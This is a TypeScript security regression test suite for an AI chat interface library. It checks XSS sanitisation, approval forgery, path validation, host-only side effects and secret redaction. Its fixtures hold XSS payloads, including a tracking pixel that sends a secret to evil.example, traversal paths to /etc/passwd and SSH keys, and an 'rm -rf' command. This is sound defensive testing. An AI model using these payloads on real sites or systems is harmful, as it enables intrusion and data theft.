/**
 * AI2-506 · Security regression harness (threat model T1/T2/T3/T5/T7).
 *
 * - XSS: hostile model output through every renderer never yields script,
 *   event handler attributes, `javascript:` links, iframes or auto-loaded
 *   remote images.
 * - Approval: a client cannot fabricate, widen or locally "approve"; only a
 *   host `approval.resolved` decides, and offline clicks never approve.
 * - Paths: hostile change-set, diff and test-report paths are rejected
 *   before they reach state or the DOM.
 * - Host-only side effects: applying changes is a command; no AI package
 *   imports filesystem, process or network-SDK modules.
 * - Redaction: secret-looking tool inputs never reach the DOM.
 */

import type { Mounted } from './harness'

import { readdirSync, readFileSync, statSync } from 'node:fs'
import { join } from 'node:path'
import {
  createApprovalController,
  createChangeSetActions,
  createConversationController,
  isSafeRelativePath,
  parseTestReport,
  parseUnifiedDiff,
} from '@zeus-web/ai-core'
import { afterEach, describe, expect, it } from 'vitest'
import { createWorld, FRAMEWORKS, mount, T } from './harness'

const mounted: Mounted[] = []

afterEach(() => {
  for (const entry of mounted.splice(0)) entry.unmount()
  document.body.innerHTML = ''
})

const XSS_CORPUS = [
  '<script>window.__pwned = 1</script>',
  '<img src=x onerror="window.__pwned=1">',
  '<svg onload="window.__pwned=1"></svg>',
  '<iframe src="javascript:window.__pwned=1"></iframe>',
  '[click](javascript:window.__pwned=1)',
  '[click](JAVASCRIPT:window.__pwned=1)',
  '[click](java\tscript:window.__pwned=1)',
  '[x](data:text/html;base64,PHNjcmlwdD53aW5kb3cuX19wd25lZD0xPC9zY3JpcHQ+)',
  '![track](https://evil.example/pixel.gif?secret=1)',
  '<a href="javascript:window.__pwned=1">x</a>',
  '<style>body{display:none}</style>',
  '```html\n<script>window.__pwned=1</script>\n```',
  '<math><mtext><table><mglyph><style><img src=x onerror=window.__pwned=1>',
].join('\n\n')

describe('xss through every renderer', () => {
  it.each(FRAMEWORKS)(
    '%s renders hostile markdown inertly',
    async framework => {
      const world = createWorld()
      world.emit('conversation.upserted', 'conv-1', {
        conversation: { id: 'conv-1', title: 'x', revision: 1 },
      })
      world.emit('message.created', 'm1', {
        message: {
          id: 'm1',
          conversationId: 'conv-1',
          author: 'assistant',
          parts: [
            {
              id: 'p1',
              kind: 'text',
              revision: 0,
              text: XSS_CORPUS,
              format: 'markdown',
            },
          ],
          status: 'complete',
          revision: 1,
          createdAt: T,
        },
      })
      const conversation = createConversationController({
        session: world.session,
        conversationId: 'conv-1',
      })
      const view = await mount(framework, {
        kind: 'timeline',
        session: world.session,
        conversation,
      })
      mounted.push(view)
      const root = view.container

      expect(
        root.querySelectorAll(
          'script, iframe, style, svg, math, object, embed',
        ),
      ).toHaveLength(0)
      expect(root.querySelectorAll('img')).toHaveLength(0)
      for (const element of Array.from(root.querySelectorAll('*'))) {
        for (const attribute of Array.from(element.attributes)) {
          expect(
            attribute.name.startsWith('on'),
            `${element.localName}[${attribute.name}]`,
          ).toBe(false)
        }
      }
      for (const anchor of Array.from(root.querySelectorAll('a'))) {
        expect(anchor.getAttribute('href')).toMatch(/^(https?:|mailto:|#)/)
        if (!anchor.getAttribute('href')!.startsWith('#')) {
          expect(anchor.getAttribute('rel')).toContain('noopener')
        }
      }
      expect((globalThis as { __pwned?: number }).__pwned).toBeUndefined()
      // The hostile text is still visible to the reader, as text.
      expect(root.textContent).toContain('<script>window.__pwned = 1</script>')
    },
  )
})

describe('approval cannot be forged on the client', () => {
  function seeded() {
    const world = createWorld()
    world.emit('execution.started', 'e1', {
      execution: {
        id: 'e1',
        kind: 'agent',
        status: 'running',
        createdAt: T,
        revision: 1,
        activeStepIds: [],
      },
    })
    return world
  }

  const approval = (overrides: Record<string, unknown> = {}) => ({
    approval: {
      id: 'a1',
      executionId: 'e1',
      title: 'rm -rf build',
      summary: 'delete build output',
      operation: { kind: 'shell', target: 'ws-1: rm -rf build' },
      scope: 'once',
      risk: 'high',
      status: 'pending',
      revision: 1,
      ...overrides,
    },
  })

  it('refuses a request that arrives pre-approved or widens scope / lowers risk', () => {
    const world = seeded()
    expect(() =>
      world.emit('approval.requested', 'a1', approval({ status: 'approved' })),
    ).toThrow(/illegal-transition/)

    const fresh = seeded()
    fresh.emit('approval.requested', 'a1', approval())
    expect(() =>
      fresh.emit(
        'approval.requested',
        'a1',
        approval({ scope: 'workspace', revision: 2 }),
      ),
    ).toThrow(/immutable-field/)
    expect(fresh.session.store.getState().approvals.get('a1')!.scope).toBe(
      'once',
    )
  })

  it('never shows approved without the host event, even after an accepted ack', async () => {
    const world = seeded()
    world.emit('approval.requested', 'a1', approval())
    const controller = createApprovalController({
      session: world.session,
      approvalId: 'a1',
    })

    await controller.approve()
    expect(controller.getSnapshot().displayStatus).toBe('submitted')
    expect(world.session.store.getState().approvals.get('a1')!.status).toBe(
      'pending',
    )
  })

  it('does not approve offline', async () => {
    const world = seeded()
    world.emit('approval.requested', 'a1', approval())
    world.host.close()
    const controller = createApprovalController({
      session: world.session,
      approvalId: 'a1',
    })

    const ack = await controller.approve()
    expect(ack.accepted).toBe(false)
    expect(controller.getSnapshot()).toMatchObject({
      displayStatus: 'pending',
      canDecide: true,
    })
  })

  it('cannot be unlocked by editing the DOM', async () => {
    const world = seeded()
    world.emit(
      'approval.requested',
      'a1',
      approval({ expiresAt: '2000-01-01T00:00:00.000Z' }),
    )
    const controller = createApprovalController({
      session: world.session,
      approvalId: 'a1',
    })
    const view = await mount('wc', { kind: 'approval', controller })
    mounted.push(view)

    const approve = view.container.querySelector<HTMLButtonElement>(
      '[data-action="approve"]',
    )!
    expect(approve.disabled).toBe(true)
    approve.removeAttribute('disabled')
    approve.click()
    await view.flush()
    expect(world.host.commands()).toHaveLength(0)
  })
})

describe('paths', () => {
  const hostile = [
    '../etc/passwd',
    'a/../../b',
    '/etc/passwd',
    '\\\\server\\share',
    'C:\\Windows',
    '~/.ssh/id_rsa',
    'ok\nINJECTED',
    'nul\u0000byte',
  ]

  it.each(hostile)('rejects %j everywhere a path enters', path => {
    expect(isSafeRelativePath(path)).toBe(false)
    expect(
      parseUnifiedDiff(`--- a/${path}\n+++ b/${path}\n@@ -1 +1 @@\n-a\n+b\n`)
        .ok,
    ).toBe(false)
    expect(
      parseTestReport({
        schema: 'zeus.test-report/v1',
        summary: { passed: 0, failed: 1, skipped: 0 },
        cases: [
          { id: 'x', name: 'x', status: 'failed', location: { file: path } },
        ],
      }).ok,
    ).toBe(false)

    const world = createWorld()
    world.emit('execution.started', 'e1', {
      execution: {
        id: 'e1',
        kind: 'agent',
        status: 'running',
        createdAt: T,
        revision: 1,
        activeStepIds: [],
      },
    })
    expect(() =>
      world.emit('changeset.updated', 'cs', {
        changeset: {
          id: 'cs',
          executionId: 'e1',
          workspaceId: 'ws',
          baseRevision: 'b',
          files: [{ path, status: 'modified' }],
          status: 'ready',
          revision: 1,
        },
      }),
    ).toThrow(/invalid-payload|rejected/)
  })
})

describe('side effects stay on the host', () => {
  it('applies changes only by sending a bound command', async () => {
    const world = createWorld()
    world.emit('execution.started', 'e1', {
      execution: {
        id: 'e1',
        kind: 'agent',
        status: 'running',
        createdAt: T,
        revision: 1,
        activeStepIds: [],
      },
    })
    world.emit('changeset.updated', 'cs', {
      changeset: {
        id: 'cs',
        executionId: 'e1',
        workspaceId: 'ws-1',
        baseRevision: 'abc',
        files: [{ path: 'src/a.ts', status: 'modified' }],
        status: 'ready',
        revision: 4,
      },
    })
    const actions = createChangeSetActions({
      session: world.session,
      changeSetId: 'cs',
    })

    await actions.request('apply')
    expect(world.host.commands()[0]).toMatchObject({
      type: 'changeset.apply',
      expectedRevision: 4,
      payload: { workspaceId: 'ws-1', baseRevision: 'abc' },
    })
    // Still the host's status: nothing was applied locally.
    expect(world.session.store.getState().changeSets.get('cs')!.status).toBe(
      'ready',
    )
  })

  it('keeps filesystem, process and vendor SDK imports out of every AI package', () => {
    const root = join(__dirname, '..', '..', 'packages')
    const forbidden =
      /from ['"](?:node:)?(?:fs|child_process|net|tls|http|https|worker_threads)['"]|from ['"](?:openai|@anthropic-ai\/sdk|axios)['"]|\bprocess\.env\b|\beval\(|new Function\(/

    function walk(dir: string): string[] {
      return readdirSync(dir).flatMap(entry => {
        const path = join(dir, entry)
        return statSync(path).isDirectory()
          ? walk(path)
          : path.endsWith('.ts')
            ? [path]
            : []
      })
    }

    for (const pkg of [
      'ai-core',
      'ai-adapters',
      'ai-primitives',
      'ai-react',
      'ai-vue',
      'ai-wc',
    ]) {
      for (const file of walk(join(root, pkg, 'src'))) {
        expect(readFileSync(file, 'utf8'), file).not.toMatch(forbidden)
      }
    }
  })

  it('never injects HTML strings', () => {
    const root = join(__dirname, '..', '..', 'packages')
    for (const pkg of ['ai-primitives', 'ai-react', 'ai-vue', 'ai-wc']) {
      for (const file of readdirSync(join(root, pkg, 'src'))) {
        if (!file.endsWith('.ts')) continue
        const source = readFileSync(join(root, pkg, 'src', file), 'utf8')
        expect(source, file).not.toMatch(
          /innerHTML\s*=|dangerouslySetInnerHTML|v-html|insertAdjacentHTML|outerHTML\s*=/,
        )
      }
    }
  })
})

describe('redaction', () => {
  it.each(FRAMEWORKS)(
    '%s never renders secret tool inputs',
    async framework => {
      const world = createWorld()
      world.emit('execution.started', 'e1', {
        execution: {
          id: 'e1',
          kind: 'agent',
          status: 'running',
          createdAt: T,
          revision: 1,
          activeStepIds: [],
        },
      })
      world.emit('approval.requested', 'a1', {
        approval: {
          id: 'a1',
          executionId: 'e1',
          title: 'Call API',
          summary: 'POST /deploy',
          operation: {
            kind: 'http',
            target: 'api.example.com',
            preview: {
              headers: { Authorization: 'Bearer live-secret-token' },
              apiKey: 'sk-live-0123456789abcdef',
            },
          },
          scope: 'once',
          risk: 'high',
          status: 'pending',
          revision: 1,
        },
      })
      const controller = createApprovalController({
        session: world.session,
        approvalId: 'a1',
      })
      const view = await mount(framework, { kind: 'approval', controller })
      mounted.push(view)

      expect(view.container.textContent).not.toMatch(
        /live-secret-token|sk-live-0123/,
      )
      expect(view.container.textContent).toContain('api.example.com')
    },
  )
})
